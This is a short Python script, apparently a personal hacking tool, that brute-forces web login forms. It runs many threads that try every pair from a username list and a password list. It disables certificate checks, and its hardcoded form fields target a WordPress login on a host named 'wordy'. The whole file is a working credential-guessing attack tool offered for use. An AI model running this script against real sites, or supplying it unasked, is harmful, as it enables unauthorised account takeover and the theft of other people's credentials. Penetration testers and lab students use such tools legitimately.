#!/usr/bin/env python3
#brute.py : @jockemedlinux 2023-04-21      			#
#Version v1.0: Bruteforcing web login form easily.  #
#####################################################
import requests,argparse,sys,time
import concurrent.futures

def login(url, username, password, cookies):
	r = requests.post(url, data={
		args.f1: username,
		args.f2: password,
		"wp-submit": args.f3, 	#If needed. Uncomment args.f3 below.
		"redirect_to": "http%3A%2F%2Fwordy%2Fwp-admin%2F",
		"testcookie":1,
		}, 
	verify = False,
	headers = cookies,
	)
	return r.text

def bruteforce(url, username, password, cookies, args):
	global counter
	logins = login(url, username, password, cookies)
	counter += 1
	if args.s in logins:
		print(f"Tried {username}:{password:<30} | so far we've done {counter} attempts")
		return None
		counter+=1
	else:
		print(f"\033[91m## Login Found ## \n{username}:{password}\033[0m")
		return username + ":" + password


if __name__ == "__main__":
	parser = argparse.ArgumentParser("bruteforcer.py")
	parser.add_argument("-H", type=str, help="The URL", required=True)
	parser.add_argument("-U", type=str, help="Usernames file", required=True)
	parser.add_argument("-P", type=str, help="Passwords file", required=True)
	parser.add_argument("-s", type=str, help="Error response from page. ('Username incorrect')", required=False)
	parser.add_argument("-f1", type=str, help="formdata #1", required=True)
	parser.add_argument("-f2", type=str, help="formdata #2", required=True)
	parser.add_argument("-f3", type=str, help="formdata #3", required=True)
	parser.add_argument("-C", type=str, help="Cookies data (The value only)", required=False)
	parser.add_argument("-t", type=int, help="number of threads", required=False, default=20)
	args = parser.parse_args()

	counter = 1
	cookies = {"Cookie":args.C} if args.C else None
	url = args.H
	print("-" * 100)
	print("\nAttacking: %s\n" % (url))
	print("-" * 100)
	creds = []
	time.sleep(2)
	
	with open(args.U, "r") as userfile:
		usernames = [line.strip() for line in userfile.read().split("\n") if line]
	with open(args.P, "r") as passfile:
		passwords = [line.strip() for line in passfile.read().split("\n") if line]
		try:
			with concurrent.futures.ThreadPoolExecutor(max_workers=args.t) as executor:
				futures = []
				for username in usernames:
					for password in passwords:
						futures.append(executor.submit(bruteforce, url, username, password, cookies, args))
				for future in concurrent.futures.as_completed(futures):
					if future.result():
						creds.append(future.result())
			if creds:
				print("\nThese credentials were found!")
				print(f'\033[91m {creds} \033[0m')
			else:
				print("\nNo credentials found..")
		except KeyboardInterrupt:
			if creds:
				print("\nThese credentials were found!")
				print(creds)			
			else:
				print("\nNo credentials found..")
				print("\nInterrupted by user. Quitting...")
			exit()
			executor.shutdown(wait=True)